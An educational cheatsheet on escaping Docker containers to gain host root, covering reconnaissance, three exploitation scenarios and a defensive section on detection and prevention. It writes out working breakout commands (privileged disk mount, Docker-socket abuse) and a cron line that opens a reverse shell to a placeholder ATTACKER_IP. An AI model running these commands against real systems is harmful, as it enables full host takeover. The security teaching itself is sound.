## 🏢 Cheatsheet: Container Breakout Privilege Escalation

Containers provide operating-system-level virtualization, isolating application processes in user space but sharing the host's kernel. A "container breakout" or "escape" occurs when a process inside a container bypasses these isolation mechanisms. Since the container daemon often runs as **root** on the host, a successful breakout typically results in full root compromise of the host machine.

### ## What to Look For (Reconnaissance from Inside a Container)

The first step for an attacker is to determine if they are inside a container and look for misconfigurations.

* **Check for Container Environments:**
    ```bash
    # Docker often creates this file
    ls -l /.dockerenv

    # Check the process control groups
    cat /proc/1/cgroup
    # Output will contain paths with "docker" or "lxc"
    ```

* **Look for Common Misconfigurations:**
    * **Is the container privileged?** Privileged containers have most security restrictions disabled.
    * **Is the Docker socket mounted?** This is a critical vulnerability.
        ```bash
        ls -l /var/run/docker.sock
        ```
    * **Are any host filesystems mounted?** Check the output of the `mount` or `df -h` command for sensitive host paths like `/`, `/root`, or `/etc`.
    * **What capabilities does the container have?**
        ```bash
        capsh --print
        ```
        Look for powerful capabilities like `CAP_SYS_ADMIN`.

---

### ## Common Exploitable Scenarios & Payloads

Breakouts usually exploit configuration weaknesses rather than novel zero-day vulnerabilities.

#### **Scenario 1: The `--privileged` Flag**
If a container is run with `--privileged`, a breakout is trivial. The attacker has direct access to host devices.

* **Exploitation:**
    The attacker can simply mount the host's disk and `chroot` into it.
    ```bash
    # Find the host's disk (e.g., /dev/sda1)
    fdisk -l
    # Mount it and chroot
    mkdir /host
    mount /dev/sda1 /host
    chroot /host
    ```

#### **Scenario 2: Mounted Docker Socket (Most Common)**
If the Docker socket (`/var/run/docker.sock`) is mounted inside the container, the attacker can use it to communicate with the host's Docker daemon.

* **Exploitation:**
    From inside the container, the attacker uses the `docker` client to launch a new, privileged container that mounts the host's root filesystem.
    ```bash
    # 1. Install docker client inside the container if not present
    # (e.g., apt update && apt install docker.io)

    # 2. Run a new container, mounting the host's root directory (/) to /host
    docker run -it -v /:/host --rm alpine

    # 3. You are now in a new container, but the host's filesystem is at /host.
    # Change your root to the host's filesystem.
    chroot /host
    ```
    You now have a root shell on the host system.

#### **Scenario 3: Host Path Mounts**
If a sensitive host directory is mounted, the attacker can use it to gain control.

* **Discovery:** `mount` shows that `/` on the host is mounted at `/mnt/host` in the container.
* **Exploitation:** The attacker can add their own user to the host's `/etc/passwd` file, add their SSH key to the root user's `authorized_keys`, or create a cron job on the host.
    ```bash
    # From inside the container, create a cron job on the host
    echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /mnt/host/etc/cron.d/revshell
    ```

---

### ## 🛡️ Detection & Remediation (For Defenders)

#### **How to Detect an Attempt**

* **Runtime Security Monitoring:** Use tools like **Falco**, **Aqua Security**, or **Sysdig** to detect anomalous behavior, such as a process inside a container trying to access the Docker socket or spawning a shell from an unexpected process.
* **Audit Docker Daemon Logs:** Monitor the Docker daemon logs (`journalctl -u docker.service`) for containers being launched from unexpected sources (i.e., from another container).

#### **How to Prevent Container Breakouts**

* **NEVER Use `--privileged`:** Avoid this flag unless you have an extreme, well-understood need. It disables nearly all container security mechanisms.
* **NEVER Mount the Docker Socket:** Do not mount `/var/run/docker.sock` into your containers. This is the most common and dangerous misconfiguration.
* **Principle of Least Privilege for Mounts:** Only mount the specific files or directories your application needs. Never mount `/`. Always use read-only (`:ro`) mounts whenever possible.
* **Drop Capabilities:** Run containers with the minimum set of capabilities required.
    ```bash
    # Example: Drop all capabilities, then add back only what's needed
    docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE ...
    ```
* **Run as a Non-Root User:** Use the `USER` instruction in your Dockerfile to run the application process as a non-root user.
* **Use Rootless Containers:** Configure the Docker daemon itself to run as a non-root user. This massively mitigates the impact of a breakout, as the escaped process would only have the privileges of that user, not the host's root.
* **Use Security Profiles:** Enforce security profiles like **AppArmor** and **Seccomp** to restrict the system calls a container can make. Docker applies default profiles, but you can create stricter custom ones.
